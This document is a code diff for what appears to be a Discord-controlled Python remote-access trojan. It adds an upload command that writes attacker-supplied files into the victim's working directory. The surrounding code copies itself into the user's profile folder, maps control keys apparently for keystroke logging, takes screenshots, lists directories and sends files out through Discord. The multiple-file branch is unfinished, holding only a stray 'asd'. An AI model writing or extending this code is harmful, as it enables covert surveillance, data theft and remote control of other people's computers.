@@ -59,6 +59,7 @@ client = discord.Client(intents=discord.Intents.all())
 ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
 text_buffor, force_to_send = '', False
 messages_to_send, files_to_send, embeds_to_send = [], [], []
+files_to_merge, expectation, one_file_attachment_message = [], None, None
 working_directory = sys.argv[0].split('\\')[:-1]
 
 if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
@@ -121,24 +122,36 @@ async def on_raw_reaction_add(payload):
 
 @client.event
 async def on_reaction_add(reaction, user):
-    global tree_messages, messages_from_sending_big_file
+    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge
     if user.bot == False:
         try:
-            if str(reaction) == '🔴':
-                if reaction.message.content[:15] == '```End of tree.':
-                    for i in tree_messages:
-                        await i.delete()
-                    tree_messages = []
-                    os.system('del tree.txt')
-            elif str(reaction) == '📥':
-                if reaction.message.content[:15] == '```End of tree.':
-                    await reaction.message.channel.send(file=discord.File('tree.txt'))
-                    os.system('del tree.txt')
-            elif str(reaction) == '✅':
-                if len(messages_from_sending_big_file) > 1:
-                    for i in messages_from_sending_big_file:
-                        await i.delete()
-                    messages_from_sending_big_file = []
+            match str(reaction):
+                case '🔴':
+                    if reaction.message.content[:15] == '```End of tree.':
+                        for i in tree_messages:
+                            await i.delete()
+                        tree_messages = []
+                        os.system('del tree.txt')
+                case '📥':
+                    if reaction.message.content[:15] == '```End of tree.':
+                        await reaction.message.channel.send(file=discord.File('tree.txt'))
+                        os.system('del tree.txt')
+                case '✅':
+                    if len(messages_from_sending_big_file) > 1:
+                        for i in messages_from_sending_big_file:
+                            await i.delete()
+                        messages_from_sending_big_file = []
+                case '📤':
+                    if expectation == 'onefile':
+                        split_v1 = str(one_file_attachment_message.attachments).split("filename='")[1]
+                        filename = str(split_v1).split("' ")[0]
+                        await one_file_attachment_message.attachments[0].save(fp='/'.join(working_directory) + '/' + filename)
+                        async for message in reaction.message.channel.history(limit=2):
+                            await message.delete()
+                        await reaction.message.channel.send('```Uploaded  ' + filename + '  into  ' + '/'.join(working_directory) + '/' + filename + '```')
+                    elif expectation == 'multiplefiles':
+                        asd
+                    
         except: pass
 
 @client.event
@@ -152,7 +165,7 @@ async def on_raw_reaction_remove(payload):
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message
     if message.author != client.user:
         if message.content == '.ss':
             await message.delete()
@@ -216,28 +229,36 @@ async def on_message(message):
                 reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
         elif message.content == '.ls':
-            dir_content_f, dir_content_d, directory_content = [], [], []
-            for element in os.listdir('/'.join(working_directory)):
-                if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
-                else: dir_content_d.append(element)
-            dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)
-            for single_directory in dir_content_d: directory_content.append(single_directory)
-            for single_file in dir_content_f: directory_content.append(single_file)
-            await message.channel.send('```Content of ' + '/'.join(working_directory) +' at ' + current_time() + '```')
-            lsoutput = directory_content
-            while lsoutput != []:
-                if len('\n'.join(lsoutput)) > 1994:
-                    temp = ''
-                    while len(temp+lsoutput[0])+1 < 1994:
-                        temp += lsoutput[0] + '\n'
-                        lsoutput.pop(0)
-                    await message.channel.send('```' + temp + '```')
-                else:
-                    await message.channel.send('```' + '\n'.join(lsoutput) + '```')
-                    lsoutput = []
+            await message.delete()
+            if message.channel.id == channel_ids['file']:
+                dir_content_f, dir_content_d, directory_content = [], [], []
+                for element in os.listdir('/'.join(working_directory)):
+                    if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
+                    else: dir_content_d.append(element)
+                dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)
+                for single_directory in dir_content_d: directory_content.append(single_directory)
+                for single_file in dir_content_f: directory_content.append(single_file)
+                await message.channel.send('```Content of ' + '/'.join(working_directory) +' at ' + current_time() + '```')
+                lsoutput = directory_content
+                while lsoutput != []:
+                    if len('\n'.join(lsoutput)) > 1994:
+                        temp = ''
+                        while len(temp+lsoutput[0])+1 < 1994:
+                            temp += lsoutput[0] + '\n'
+                            lsoutput.pop(0)
+                        await message.channel.send('```' + temp + '```')
+                    else:
+                        await message.channel.send('```' + '\n'.join(lsoutput) + '```')
+                        lsoutput = []
+            else:
+                reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
         elif message.content == '.pwd':
-            reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
+            await message.delete()
+            if message.channel.id == channel_ids['file']:
+                reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
+            else:
+                reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
         elif message.content[:9] == '.download':
             await message.delete()
@@ -276,6 +297,28 @@ async def on_message(message):
                         reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
             else:
                 reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+
+        elif message.content[:7] == '.upload':
+            await message.delete()
+            if message.channel.id == channel_ids['file']:
+                if message.content == '.upload':
+                    reaction_msg = await message.channel.send('```Syntax: .upload <type>\nTypes:\n    single - upload one file with size less than 8MB\n    multiple - upload multiple files prepared by Splitter with total size greater than 8MB```'); await reaction_msg.add_reaction('🔴')
+                else:
+                    if message.content[8:] == 'single':
+                        expectation = 'onefile'
+            else:
+                reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+
+        elif expectation == 'onefile':
+            split_v1 = str(message.attachments).split("filename='")[1]
+            filename = str(split_v1).split("' ")[0]
+            reaction_msg = await message.channel.send('```This file will be uploaded to  ' + '/'.join(working_directory) + '/' + filename + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```')
+            await reaction_msg.add_reaction('📤')
+            await reaction_msg.add_reaction('🔴')
+            one_file_attachment_message = message
+
+        elif expectation == 'multiplefiles':
+            files_to_merge.append(message)
 
 class PyAudioPCM(discord.AudioSource):
     def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
